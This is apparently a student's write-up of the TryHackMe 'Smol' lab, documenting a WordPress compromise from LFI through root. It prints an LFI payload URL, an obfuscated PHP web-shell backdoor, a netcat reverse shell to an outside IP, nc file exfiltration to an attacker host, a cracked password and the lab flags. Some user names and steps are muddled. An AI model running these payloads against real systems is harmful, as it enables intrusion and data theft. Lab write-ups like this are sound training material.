# Project: Smol Penetration Test (TryHackMe)

**Date**: December 2025
**Target**: 10.64.187.45 (www.smol.thm)
**Tools Used**: Nmap, Gobuster, Burp Suite, John the Ripper, Zip2John, Netcat, SSH
**Vulnerability Explored**: Local File Inclusion (LFI), PHP Backdoor, Weak Credentials, Sudo Misconfiguration

## 1\. Executive Summary

**Objective**: Conduct a black-box penetration test on the target host "Smol" to identify vulnerabilities, gain initial access via web exploitation, and escalate privileges to root.

**Result**: The assessment identified a critical Local File Inclusion (LFI) vulnerability in the JSmol2WP WordPress plugin. This vulnerability was chained with a PHP backdoor discovered in the "Hello Dolly" plugin to achieve Remote Code Execution (RCE). Post-exploitation involved lateral movement through multiple users (think, gege, xavi) by exploiting weak credentials and an insecure zip archive (wordpress.old.zip). Final privilege escalation to root was achieved via a sudo misconfiguration allowing the user xavi to execute a shell as root without a password.

## 2\. Technical Findings \& Walkthrough

### Step 1: Reconnaissance \& Enumeration

**Objective**: Identify open ports, domain resolution, and web application structure.

**Methodology**: I initiated the engagement with an Nmap service scan to identify active ports and services.

```bash
nmap -sV 10.64.187.45
```

**Findings**:

* **Port 22**: OpenSSH 8.2p1 (Ubuntu).
* **Port 80**: Apache httpd 2.4.41.

!\[Nmap output](img/nmap\_output.png)

Attempts to enumerate the web server using Gobuster initially failed due to DNS resolution errors. I manually added the domain `www.smol.thm` to my `/etc/hosts` file to resolve this.

```bash
echo "10.64.187.45 www.smol.thm smol.thm" | sudo tee -a /etc/hosts
```

With the domain resolving, I proceeded to enumerate the WordPress installation and identified the existence of the JSmol2WP plugin and the Hello Dolly plugin.

### Step 2: Vulnerability Discovery (LFI \& Backdoor)

**Objective**: exploit web vulnerabilities to gain code execution.

**Analysis**: I identified a known Local File Inclusion (LFI) vulnerability in the JSmol2WP plugin.

* **Vulnerable Path**: `/wp-content/plugins/jsmol2wp/php/jsmol.php`
* **Parameter**: `query` (using the php wrapper `php://filter/resource=`)

During enumeration of the WordPress dashboard (likely via a compromised account or public disclosure), I found a critical note:

`"\[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of “Hello Dolly” plugin as the site’s code revision."`

Acting on this intelligence, I used the LFI vulnerability to inspect the source code of `hello.php`.

**Payload Used**:

```http
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true\&call=getRawDataFromDatabase\&query=php://filter/resource=../../hello.php
```

**Result**: The source code revealed a hidden PHP backdoor:

```php
if (isset($\_GET\["\\143\\155\\x64"])) { system($\_GET\["\\143\\x6d\\144"]); }
```

This obfuscated code translates to: `if (isset($\_GET\['cmd'])) { system($\_GET\['cmd']); }`.

!\[Backdoor code](img/backdoor\_code.png)

### Step 3: Exploitation (RCE)

**Objective**: Gain a reverse shell on the target system.

**Methodology**: I exploited the backdoor by sending a malicious request to the `hello.php` backdoor, executing a Netcat reverse shell via busybox.

**Payload**:

```http
http://www.smol.thm/wp-admin/index.php?cmd=busybox nc 192.168.151.228 5556 -e bash
```

**Result**: I successfully received a reverse shell as the `www-data` user.

!\[Reverse shell](img/reverse\_shell.png)

### Step 4: Post-Exploitation \& Lateral Movement

**Objective**: Elevate privileges and move laterally to internal users.

#### 4.1. Lateral Move to 'Diego'

I attempted to crack the hashes found in `hashes.txt` using John the Ripper.

```bash
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Cracked Password**: `sandiegocalifornia`

Using this password, I successfully switched users from `www-data` to `gege` and found the user flag.

```bash
su gege
# Password: sandiegocalifornia
```

**Flag 1:** `45edaec653ff9ee06236b7ce72b86963`

#### 4.2. Accessing User 'Think'

During internal enumeration, I retrieved an SSH private key (thinkrsa), found within the web directories. I also recovered a list of WordPress password hashes (`hashes.txt`).

Using the SSH key, I logged in as the user `think`.

```bash
chmod 600 thinkrsa
ssh -i thinkrsa think@www.smol.thm
```

#### 4.3. Lateral Move to 'Xavi'

Switched to `Gege`'s as they are in the same user group. In `Gege`'s home directory, I discovered a file named `wordpress.old.zip`. Attempting to unzip it locally failed due to a password requirement. I exfiltrated the file to my attacking machine using `nc` for offline cracking.

**Exfiltration**:

```bash
# Target
nc -w 3 <Attacker\_IP> 9999 < wordpress.old.zip
# Attacker
nc -lnp 9999 > wordpress.old.zip
```

**Cracking the Zip**: I used `zip2john` to extract the hash and cracked it.

```bash
zip2john wordpress.old.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Extracting the archive revealed credentials (found in a backed-up `wp-config.php`) that allowed access to the user `xavi`.

### Step 5: Privilege Escalation (Root)

**Objective**: Gain root level access.

**Methodology**: As user `xavi`, I checked for `sudo` privileges. The user `xavi` was misconfigured to run `bash` as root without a password.

**Command**:

```bash
sudo bash
```

**Result**: I obtained a root shell and found the root flag.

**Final Flag:** `4782a1a89025141569a9307525f68b3d`

!\[Root shell](img/root\_shell.png)

## 3\. Remediation \& Recommendations

* **Patch Vulnerable Plugins (Critical)** The JSmol2WP plugin allowed unauthorized file access.
  **Action**: Update the plugin to the latest secure version or remove it if unused.
* **Remove Backdoors (Critical)** The Hello Dolly plugin contained a web shell.
  **Action**: Immediately remove the malicious code and audit all plugins for file integrity.
* **Secure Sensitive Files (High)** Backup files like `wordpress.old.zip` containing sensitive data were stored in user directories.
  **Action**: Store backups in secure, non-accessible locations and ensure they are encrypted with strong passwords.
* **Sudo Configuration (Critical)** The user `xavi` had unrestricted `sudo` access.
  **Action**: Restrict `sudo` permissions to only necessary commands and enforce password requirements.

---

**Disclaimer**: This project was performed on the TryHackMe "Smol" room for educational purposes.

